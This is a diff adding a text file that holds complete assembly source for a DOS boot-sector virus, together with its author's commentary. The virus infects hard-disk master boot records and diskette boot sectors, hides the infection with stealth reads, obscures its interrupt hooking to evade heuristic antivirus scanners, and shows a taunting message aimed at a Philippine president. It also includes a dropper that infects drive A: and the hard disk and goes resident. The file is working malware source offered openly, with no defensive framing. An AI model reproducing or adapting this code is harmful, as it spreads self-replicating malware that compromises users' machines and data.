@@ -1,0 +1,279 @@
+Boot virus program written by Putoksa Kawayan
+City of Manila, Republic of the Philippines
+Virus codes written on June 19, 1996
+Dropper codes and comments added on December 25, 1998
+
+A boot infecting virus is easier to write than a file infector. It is puzzling why there are more file viruses than boot infectors. There are also less complications for a boot virus. One other positive attraction for a boot virus is that it loads before the operating system and, therefore, before any TSR antivirus programs. If your virus got something against tunnelling programs, viral or non-viral, so much the better. 
+
+This virus is a run-of-the-mill boot infector. The only thing I did here that you can call out-of-the-ordinary, is that I somewhat garbled the saving and hooking of INT 13h and getting/decreasing of memory so that I could hide from heuristic scanners. But did not work against one AV. 
+
+It is able to infect master boot record (MBR) of hard disks and boot sectors of diskettes in drives A: and B:. Infection is triggered by a read of track 0 head 0 sector 1, which is the MBR of a hard disk or boot sector of a diskette. If the accessed sector is a diskette, it is infected if it is not already infected. When it returns to the caller program, the uninfected boot sector is presented to it. The original boot sector is saved near the last sector of the diskette's root directory, the location of which is assumed by the virus. 
+
+The virus is stealth. If a read of a boot sector or MBR is made, the clean boot sector or MBR is returned to the requesting program. The interrupt handler does not infect the MBR. The MBR is infected when you boot from an infected diskette or when you execute the dropper program listed below. When a read request to first sector of a hard disk is received, the clean MBR is returned to the caller. The handler does nothing to the MBR other than hide the infection. 
+
+When booting from an infected disk on odd numbered days of the month, there is a chance that the virus message would be displayed. The message which is addressed to the former President of the Republic of the Philippines, Fidel V. Ramos, (He was still the president when the virus was written.) goes like this: 
+
+                      Fidel!
+                      STAY HOME! Or I will palo you
+ 
+"Palo", a pun for follow, in Pilipino means "to spank" or a "big whack in the behind". Steady Eddie is also fleet-footed. He is fond of going places, of course, with the government footing the bill. 
+I wrote this virus in June 1996. This is my first boot-only infector. (I already did a boot infector with the multipartite Philippines.4096.) Although the virus was completed in 1996, I only did the dropper codes on Christmas day. 
+
+The accompanying uuencoded script is the virus dropper/first geneartion program (VIRUS.COM). It is from the following source code compiled in TASM 2.01 
+
+ .model tiny
+ .code
+
+MemSize equ     413h
+OffsIp  equ     Int13Off-Begin
+OffsCS  equ     Int13Seg-Begin
+LocSig  equ     Sig-Begin
+CodeLen equ     Dropper-Start
+LocMem  equ     MemSize-(Sig-Begin)
+
+        org     0
+Begin:  jmp     Dropper
+        nop
+
+Int13Vec        label dword
+Int13Off        dw      ?
+Int13Seg        dw      ?
+
+        org     3eh
+Start:  cli 
+        xor     bx,bx 
+        mov     sp,7c00h
+        mov     ss,bx 
+        mov     ds,bx 
+        sti 
+        mov     bl,4ch                    ; set to point to int 13 at IVT
+        mov     bp,offset Sig             ; relocate to this offset at topmem
+        les     ax,dword ptr [bx]         ; get int 13
+        mov     word ptr ds:[7c00h+OffsIp],ax     ; save int 13 offset
+        mov     ax,[bp+LocMem]            ; get memory size
+        cld 
+        mov     si,sp                     ; set si to 7c00
+        xor     di,di                     ; set for topmem move destination
+        dec     ax                        ; decrease memory by 1 kb
+        mov     word ptr ds:[7c00h+OffsCs],es   ; put off saving this as 
+        push    si                              ; long as I could
+        push    ax                        ; decreased memory
+        mov     cl,6 
+        shl     ax,cl                     ; get topmem
+        mov     es,ax 
+        mov     cx,200h                   ; move code count 
+        repe movsb                        ; copy code to topmem
+        push    es
+        push    bp
+        retf                              ; relocate to topmem:Sig
+
+ItsMBR: popf                              ; set for mbr stealth!!!
+        push    cx
+        push    dx
+        mov     cl,13                     ; sector 13
+        jmp     short RetUser
+
+Sig:    pop     [bp+LocMem]               ; update memory size
+        mov     [bx+2],ax                 ; set virus cs to int 13
+        mov     ax,offset Handler
+        mov     [bx],ax                   ; set virus handler
+        push    ds
+        push    cs
+        pop     ds
+        pop     es
+        push    dx
+        xor     ah,ah                     ; check for show time
+        int     1ah
+        and     dx,05fh                   ; are bits 0-4,6 not set?
+        jnz     NoShow
+        mov     ah,4
+        int     1ah
+        and     dl,1                      ; is day of month odd?
+        jz      NoShow
+        call    D15p14y                   ; itsssss show timeeeeee! 
+NoShow: pop     dx
+        pop     bx
+        push    es
+        push    bx
+        mov     cx,13                     ; set for hard disk
+        mov     dh,ch
+        test    dl,80h                    ; is boot from hard disk?
+        jnz     FindOld                   ; nz -- its from hard disk.
+        push    dx
+        mov     dl,80h
+        call    Infect                    ; infect hard disk if theres one
+        pop     dx
+        mov     cl,0
+OrigSec equ byte ptr $-1
+        mov     dh,1
+FindOld:mov     ax,201h                   ; get saved boot 
+        call    Use13
+        jc      ErrFind                   ; on error, reset and loop back
+        retf                              ; execute original boot sector/mbr
+
+Handler:pushf
+        cmp     ah,2                      ; read?
+        jne     UseOld
+        cmp     cx,1                      ; track 0 sector 1? 
+        jne     UseOld
+        or      dh,dh                     ; head 0?
+        jnz     UseOld
+        cmp     dl,80h                    ; hard disk 1?
+        je      ItsMBR                    ; if yes, do the mbr stealth
+        cmp     dl,1                      ; diskette drive a: or b:?
+        jbe     DiskOk
+UseOld: popf                              ; if none of the above, do nothing
+        jmp     cs:[Int13Vec]
+
+DiskOk: call    Infect                    ; else, infect it if clean
+        jc      UseOld
+        popf                              ; do the diskette stealth!!!!
+        push    cx                        ; save cx and dx
+        push    dx
+        mov     cl,cs:[OrigSec]           ; get where we placed the bootsec
+        mov     dh,1                      ; set for head 1
+RetUser:push    ax                        ; save number of sectors
+        mov     al,1                      ; set to 1 sector, we already read
+        call    Use13                     ; the other sectors in Infect
+        pop     cx                        ; get number of sectors
+        mov     al,cl                     ; and set number of sectors read
+        pop     dx                        ; we do not expect any errors so
+        pop     cx                        ;   no error check
+        retf    2                         ; return to caller
+
+ErrFind:call    Reset                     ; reset and loop back to FindOld
+        jmp     FindOld
+;
+; Dedicated to the fleet-footed then President Fidel V. Ramos
+; "palo" is a pun for "follow" but "palo" in Pilipino means 
+; "to spank" or a "big whack in the behind".
+;
+Mess    db      7,"Fidel!",13,10
+        db      "STAY HOME! Or I will palo you",13,10
+MessLen equ     $-Mess
+;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+whoisme db      'Putoksa Kawayan'
+;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Reset:  xor     ax,ax                     ; reset disk
+Use13:  pushf                             ; invoke original int 13 handler
+        call    cs:[int13Vec] 
+        ret
+
+D15p14y:mov     ah,0eh                    ; show virus text
+        xor     bx,bx                     ; except for my name
+        mov     cx,MessLen
+        mov     dl,-10
+        mov     si,offset Mess
+Repe47: lodsb
+        xor     al,dl                     ; decrypt
+        int     10h                       ;   and show
+        loop    Repe47
+De14yer:nop
+        loop    De14yer                   ; delay loop
+        dec     dx   
+        jnz     De14yer                   ; more delay
+        ret
+
+Infect: push    ax                        ; save registers
+        push    cx 
+        push    dx 
+        push    si 
+        push    di 
+        push    ds 
+        push    cs 
+        pop     ds 
+        mov     si,2                      ; set loop count to 3
+ReRead: push    ax
+        call    Use13                     ; read original request
+        jnc     NoError
+        call    Reset
+        pop     ax
+        dec     si                        ; check loop count
+        jns     ReRead
+        jmp     short Eskapo
+
+NoError:pop     si                        ; discard from stack
+        xor     si,si                     ; set virus copy start
+        mov     cl,13
+        test    dl,80h                    ; are we infecting an mbr
+        jnz     Set4Sig                   ; yes. then skip sector loc save
+        mov     dh,1                      ; set diskette head 1
+        cmp     byte ptr es:[bx+15h],0fdh ; 360 kb diskette?
+        jne     Sec2Set                   ; no. already set for 
+        mov     cl,2                      ; set for 360 kb diskette
+Sec2Set:mov     byte ptr ds:[OrigSec],cl  ; save sector loc save
+Set4Sig:mov     ax,es:[bx+78h]            ; == es:[bx+LocSig] save 1 byte
+        cmp     ax,868fh                  ; signature = pop [bp+xxxx]
+        je      Eskapo                    ; its infected!!!!!
+        mov     ax,301h
+        call    Use13                     ; save original boot sector 
+        jc      Eskapo
+        cld
+        mov     al,low ((Start-Begin)-2)  ; set add factor
+        mov     di,bx
+        movsw                             ; copy entry point jump
+        add     di,ax                     ; set to jmp location
+        add     si,ax
+        mov     cx,CodeLen                ; WARNING: masm 5.0 inserts NOP here
+        repe movsb                        ; copy virus
+        mov     ax,0301h
+        xor     dh,dh                     ; write virus boot sector
+        inc     cx
+        call    Use13
+Eskapo: pop     ds                        ; restore registers
+        pop     di 
+        pop     si 
+        pop     dx 
+        pop     cx 
+        pop     ax 
+        ret
+
+Dropper:mov     ax,cs
+        add     ax,16
+        mov     ds,ax
+        push    ax
+        mov     ax,offset Reloc           ; relocate for code's org 0
+        push    ax
+        retf
+ReLoc:  mov     ah,low ((Start-Begin)-2)
+        mov     al,0ebh
+        mov     word ptr [Begin],ax       ; set entry point jump to virus
+        mov     ah,-10
+        mov     cx,offset Reset           ; encrypt our text
+        mov     si,offset Mess
+LoopTop:mov     al,[si]
+        xor     al,ah
+        mov     [si],al
+        inc     si
+        cmp     si,cx
+        jne     LoopTop
+        push    es
+        mov     ax,3513h                  ; get and save int 13
+        int     21h
+        mov     int13Off,bx 
+        mov     int13Seg,es
+        push    cs
+        pop     es
+        mov     cx,1                      ; set for infect
+        mov     bx,offset EndDrop
+        mov     ax,201h
+        xor     dx,dx                     ; drop virus in drive a:
+        call    Infect
+        mov     dl,80h                    ; drop virus in hard disk
+        call    Infect
+        pop     es
+        mov     dx,offset Handler
+        mov     ax,2513h
+        int     21h                       ; hook int 13 
+        mov     ax,3100h                  ; and go resident in low mem
+        mov     dx,((Dropper-Begin)/16)+17 ; let us not bother ourselves with 
+        int     21h                       ; topmem load. leave it to d'vx
+
+Meeee   equ     ($-Begin)                 ; paragraph align EndDrop
+Weeee   db      ((((Meeee/16)+1)*16)-Meeee) dup (1)
+
+EndDrop:
+
+end Begin
+
+
